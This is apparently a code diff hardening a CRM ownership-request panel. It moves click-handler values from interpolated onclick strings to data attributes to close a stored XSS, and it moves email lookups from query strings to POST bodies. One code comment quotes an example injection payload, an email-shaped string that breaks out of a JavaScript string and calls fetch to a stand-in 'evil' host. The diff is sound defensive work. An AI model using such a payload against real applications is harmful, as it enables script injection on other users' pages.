@@ -31,17 +31,25 @@
 
   function otKey(kind, recordId, viaEmail){ return kind+':'+recordId+':'+(viaEmail||''); }
 
+  // Every value that must reach a click handler travels as a `data-*`
+  // attribute, read back with `this.dataset`, NEVER interpolated into the
+  // `onclick="…('…')"` JS-string literal. HTML-escaping (`esc`) only protects
+  // the ATTRIBUTE — the browser decodes it before the JS string boundary is
+  // even parsed, so an escaped `'` still closes the string. A name like
+  // "O'Brien" broke the button this way, and a contact email such as
+  // `x');fetch('//evil');//@a.co` (which still matches EMAIL_RE) was stored
+  // XSS. `data-*` + `dataset` never re-enters JS parsing at all.
   function otSlotInner(id, kind, recordId, viaEmail, can, mine){
     var inner = '';
     if (mine) {
       inner = '<div class="ot-pending">' +
         '<span class="ot-pending-lbl">Requested · waiting on ' + esc((mine.approver && mine.approver.name) || 'a manager') + '</span>' +
-        '<button class="btn btn-sm btn-outline" onclick="otWithdraw(\'' + mine.id + '\',\'' + id + '\',\'' + kind + '\',\'' + recordId + '\',\'' + esc(viaEmail || '') + '\')">Withdraw</button>' +
+        '<button class="btn btn-sm btn-outline" data-req-id="' + esc(mine.id) + '" data-slot-id="' + esc(id) + '" data-kind="' + esc(kind) + '" data-record-id="' + esc(recordId) + '" data-via-email="' + esc(viaEmail || '') + '" onclick="otWithdrawFromEl(this)">Withdraw</button>' +
       '</div>';
     } else if (can && can.ok) {
       var approverName = (can.approver && can.approver.name) || 'Your manager';
       inner = '<div class="ot-ask">' +
-        '<button class="btn btn-sm btn-outline" onclick="otOpen(\'' + kind + '\',\'' + recordId + '\',\'' + esc(viaEmail || '') + '\',\'' + id + '\',\'' + esc(approverName) + '\')">Ask to take over</button>' +
+        '<button class="btn btn-sm btn-outline" data-kind="' + esc(kind) + '" data-record-id="' + esc(recordId) + '" data-via-email="' + esc(viaEmail || '') + '" data-slot-id="' + esc(id) + '" data-approver-name="' + esc(approverName) + '" onclick="otOpenFromEl(this)">Ask to take over</button>' +
         '<div class="ot-decides">' + esc(approverName) + ' decides.</div>' +
       '</div>';
     }
@@ -50,11 +58,24 @@
     return '<div id="' + id + '" class="ot-slot">' + inner + '</div>';
   }
 
+  // Read straight off the element's own dataset — never off a JS-string arg
+  // that was built by concatenating a server-supplied value into markup.
+  window.otOpenFromEl = function(el){
+    var d = el.dataset || {};
+    otOpen(d.kind, d.recordId, d.viaEmail || '', d.slotId || '', d.approverName || null);
+  };
+  window.otWithdrawFromEl = function(el){
+    var d = el.dataset || {};
+    otWithdraw(d.reqId, d.slotId || '', d.kind, d.recordId, d.viaEmail || '');
+  };
+
   function otFetch(kind, recordId, viaEmail, key, id){
-    var qs = 'kind=' + encodeURIComponent(kind) + '&record_id=' + encodeURIComponent(recordId) +
-      (viaEmail ? '&via_email=' + encodeURIComponent(viaEmail) : '');
+    // POST, not a query string — a query string would put a prospect's email
+    // address in server access logs (rampart L3).
+    var body = { kind: kind, record_id: recordId };
+    if (viaEmail) body.via_email = viaEmail;
     Promise.all([
-      apiGet('/ownership-requests/can-request?' + qs).catch(function(){ return null; }),
+      apiPost('/ownership-requests/can-request', body).catch(function(){ return null; }),
       apiGet('/ownership-requests?box=record&kind=' + encodeURIComponent(kind) + '&record_id=' + encodeURIComponent(recordId)).catch(function(){ return null; })
     ]).then(function(r){
       var can = r[0];
@@ -110,13 +131,18 @@
 
   function otCheckForModal(){
     var m = STATE._otModalState; if (!m) return;
-    var qs = 'kind=' + encodeURIComponent(m.kind) + '&record_id=' + encodeURIComponent(m.recordId) +
-      (m.viaEmail ? '&via_email=' + encodeURIComponent(m.viaEmail) : '');
-    apiGet('/ownership-requests/can-request?' + qs).then(function(can){
+    // POST, not a query string — same reason as otFetch: no email in logs.
+    var body = { kind: m.kind };
+    if (m.recordId) body.record_id = m.recordId;
+    if (m.viaEmail) body.via_email = m.viaEmail;
+    apiPost('/ownership-requests/can-request', body).then(function(can){
       var cur = STATE._otModalState; if (!cur) return; // closed already
       cur.checking = false;
       if (can && can.ok) cur.approverName = (can.approver && can.approver.name) || 'Your manager';
-      else cur.blocked = (can && can.why) || 'This can’t be requested right now.';
+      // The server's refusal field is `reason`, not `why` — `can.why` is
+      // always null/undefined here, which used to swallow every real refusal
+      // sentence and show only the generic fallback.
+      else cur.blocked = (can && can.reason) || 'This can’t be requested right now.';
       STATE.modal = otModalHtml(cur); render();
     }).catch(function(){
       var cur = STATE._otModalState; if (!cur) return;
@@ -268,7 +294,11 @@
   }
 
   function otStatusChip(status){
-    var lbl = { pending:'Pending', approved:'Approved', declined:'Declined', withdrawn:'Withdrawn' }[status] || status;
+    // The stored status is `cancelled`, never `withdrawn` — `withdrawn` was
+    // never a value the server writes, so this mapping always fell through
+    // to the raw word and showed "cancelled" instead of the plain-English
+    // "Withdrawn" the panel means to say.
+    var lbl = { pending:'Pending', approved:'Approved', declined:'Declined', cancelled:'Withdrawn' }[status] || status;
     return '<span class="ot-chip ' + esc(status || '') + '">' + esc(lbl) + '</span>';
   }
   function otAge(iso){
